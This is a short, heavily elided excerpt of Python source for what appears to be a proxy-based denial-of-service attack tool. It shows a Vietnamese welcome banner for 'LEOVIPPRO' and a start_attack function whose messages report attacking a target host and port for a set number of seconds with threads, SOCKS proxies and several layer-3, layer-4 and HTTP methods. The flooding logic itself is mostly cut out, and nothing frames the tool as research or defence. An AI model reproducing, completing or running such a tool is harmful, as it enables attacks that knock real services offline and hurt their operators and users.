def title():
    ...
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX+"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTGREEN_EX   +"        CHAO MUNG DEN VOI LEOVIPPRO        "+Fore.LIGHTGREEN_EX +"        ║\n")
...
def start_attack(method, threads, event, socks_type):
    ...
    if (cmethod != "HIT") and (cmethod not in l4) and (cmethod not in l3) and (cmethod != "OSTRESS"):
        ...
        print("{} ĐANG TẤN CÔNG VÀO {}:{} For {} GIÂY VỚI {}/{} Proxy ".format(method, target, port, sys.argv[7],len(proxies), str(nums)))
    else:
        print("{} ĐANG TẤN CÔNG VÀO {}:{} For {} GIÂY".format(method, target, port, sys.argv[7]))
    try:
        if method == "post":
